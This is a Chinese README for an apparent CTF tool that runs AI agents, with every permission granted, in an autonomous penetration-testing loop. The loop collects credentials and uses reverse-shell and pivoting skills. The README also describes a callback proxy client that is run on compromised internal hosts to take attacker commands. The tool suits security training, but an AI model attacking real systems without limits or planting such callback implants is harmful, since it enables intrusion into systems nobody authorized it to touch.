# pen-agent

自动化渗透测试智能体框架，基于 opencode run 引擎，配合 yaklang/hack-skills 技能库，实现全自主 flag 狩猎。

## 前置条件

**pen-agent 不独立运行 AI**，它必须连接到一个运行中的 opencode 后端。

### 1. 启动 opencode 网关

```bash
# 方式 A：Web 模式（推荐，有界面）
opencode web --hostname 0.0.0.0 --port 4096 &

# 方式 B：纯 API 模式（无界面）
opencode serve --port 4096 &
```

> 如果你已经在用 opencode 的桌面版或 IDE，后端已自动运行，跳过此步。

### 2. 配置 API Key（如果还没有）

```bash
opencode auth login   # 交互式配置
# 或启动时直接传入：
node index.js -k sk-xxxxxxxxx ...
```

### 3. 启动渗透

```bash
# pen-agent 通过 --attach 连到上一步的 opencode 后端
node index.js -t <目标IP> -p <端口> -f <flag数量>
```

**关键**：pen-agent 默认 `--attach http://localhost:4096`，就是连到第 1 步启动的那个网关。如果网关在其他地址，用 `--attach` 指定。

## 快速开始

```bash
# 终端 1：启动 opencode 网关
opencode web --hostname 0.0.0.0 --port 4096 &

# 终端 2：启动渗透
node index.js -t 192.168.1.100 -p 80 -f 3
```

## 命令行参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-t, --target` | 目标 IP/域名 | `127.0.0.1` |
| `-p, --port` | 目标端口 | `80` |
| `-f, --flags` | 需要找到的 flag 数量 | `1` |
| `-m, --model` | opencode 模型 | `deepseek/deepseek-v4-flash` |
| `-k, --key` | API Key（自动写入 auth.json） | — |
| `--attach` | opencode 后端地址 | `http://localhost:4096` |
| `--max-loops` | 最大迭代次数 | `50` |
| `--proxy-port` | 内网代理端口 | `9999` |
| `--pattern` | 自定义 flag 正则 | `flag{...}\|Flag{...}\|CTF{...}` |

## 架构

```
index.js              # 入口，参数解析，自动清理旧数据
agent-loop.js         # 主循环：上下文 → opencode → supervisor → 白板
runner.js             # 封装 opencode run，spawn 流式输出到 stream.log
supervisor.js         # 监督 Agent：LLM 提炼 raw 输出为结构化发现
whiteboard.js         # 白板：append-only 迭代日志，每轮追加新发现
flag-counter.js       # flag 扫描和去重
config.js             # 参数解析和配置
proxy/proxy-client    # Go 编译的内网代理客户端（静态链接，4.6MB，零依赖）
proxy/proxy-client.go # 代理客户端源码
proxy/proxy-server.js # 代理服务器（attack 端，启动时自动运行）
```

## 外部配置（opencode 相关）

pen-agent 本身不调 API，依赖 opencode 作为引擎。以下配置文件在项目目录之外：

### 1. 全局配置 — `~/.config/opencode/opencode.jsonc`

```jsonc
{
  "$schema": "https://opencode.ai/config.json"
}
```

目前为空，默认行为。可配置 `model`、`provider`、`permission` 等全局设置。

### 2. 项目配置 — `pen-agent/opencode.json`

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "model": "deepseek/deepseek-v4-flash",
  "permission": {
    "*": "allow"
  },
  "provider": {
    "deepseek": {
      "options": { "timeout": 600000 }
    }
  }
}
```

pen-agent 的项目级 opencode 配置。默认使用 DeepSeek v4-flash，所有权限全开。

### 3. API Key — `~/.local/share/opencode/auth.json`

```json
{
  "deepseek": {
    "type": "api",
    "key": "sk-xxxxxxxxx"
  }
}
```

由 `opencode auth login` 创建，也可用 `-k` 参数在启动时自动写入。

### 4. Skills — `~/.config/opencode/skills/`

来源于 [yaklang/hack-skills](https://github.com/yaklang/hack-skills)（102 个渗透技能），安装在全局 opencode skills 目录，通过原生 `skill` 工具按需加载。

```
~/.config/opencode/skills/
├── sqli-sql-injection/SKILL.md
├── xss-cross-site-scripting/SKILL.md
├── path-traversal-lfi/SKILL.md
├── cmdi-command-injection/SKILL.md
├── linux-privilege-escalation/SKILL.md
├── reverse-shell-techniques/SKILL.md
├── tunneling-and-pivoting/SKILL.md
├── recon-and-methodology/SKILL.md
└── ... (共102个)
```

**重要**：skill 目录名必须与 `SKILL.md` 中的 `name` 字段一致，格式为小写字母+连字符。

### 5. 会话数据库 — `~/.local/share/opencode/opencode.db`

SQLite 数据库，存放所有历史会话。可用 `opencode session list` 查看。

### 6. Provider 刷新 — `opencode models`

```
opencode models --refresh    # 刷新可用模型列表
```

### 7. Agent 配置 — `opencode agent list`

```bash
opencode agent list          # 列出可用 agent
opencode agent create        # 创建自定义 agent
```

pen-agent 默认使用 `build` agent，可通过 `-a` 指定其他。

## 工作流程

```
                     ┌──────────────────┐
                     │ 1. 启动 proxy + 连接 opencode   │
                     └────────┬─────────┘
                              │
              ┌───────────────▼───────────────┐
              │ 2. 构造 prompt (mission brief)│
              │    + 白板历史（上次迭代摘要）   │
              └───────────────┬───────────────┘
                              │
              ┌───────────────▼───────────────┐
              │ 3. opencode run（主 Agent）    │
              │    → DeepSeek API             │
              │    → bash/curl/nmap/skill...  │
              │    → 流式输出到 stream.log     │
              └───────────────┬───────────────┘
                              │
              ┌───────────────▼───────────────┐
              │ 4. supervisor（监督 Agent）    │
              │    → DeepSeek API (轻量调用)   │
              │    → 提炼: 位置/权限/情报/flag │
              └───────────────┬───────────────┘
                              │
              ┌───────────────▼───────────────┐
              │ 5. 写入白板（append-only）    │
              │    state.json 追加迭代条目     │
              └───────────────┬───────────────┘
                              │
                ┌─────────────▼──────┐
                │ flags >= needed ?   │
                │ YES ▼        NO ▼  │
                │ 退出         回到 2 │
                └────────────────────┘
```

### 白板结构

每次迭代追加一条记录到 `state.json`：

```
iterations[0]
  ├── position:  "当前所在节点和权限"
  ├── summary:   "本轮做了什么，发现什么"
  ├── access:    ["新获取的访问权限"]
  ├── intel:     ["战术情报（子网、服务、凭据、漏洞）"]
  ├── flags:     ["本轮新发现的 flag"]
  ├── hosts:     ["新发现的 IP/主机"]
  ├── services:  [{"host":"ip","port":80,"name":"http"}]
  ├── credentials: [{"username":"","password":"","host":"","service":""}]
  └── actions:   ["本轮执行的关键操作"]
```

### 可观测文件

```
.pen-agent/
├── state.json    # 白板：追加式迭代日志（给下一轮 AI 的上下文）
├── stream.log    # full raw output（仅 debug，不入 prompt）
├── status.json   # 实时进度（phase/bytes/iter）
└── prompt.txt    # 最新一轮发给 AI 的 prompt
```

用 `node index.js --status` 或 `npm run status` 查看实时进度。

## 内网代理

代理模式为 polling — 目标无需公网可达：

```
Attacker                              Internal Host
┌──────────────┐                      ┌──────────┐
│ proxy-server │◄──── register ───────│  client  │
│   (port 9999)│───── command ───────►│          │
│              │◄───── result ────────│          │
└──────────────┘                      └──────────┘
```

```bash
# Attacker 端自动运行，目标端上传二进制执行：
./proxy-client --host <attacker-ip> --port 9999
```
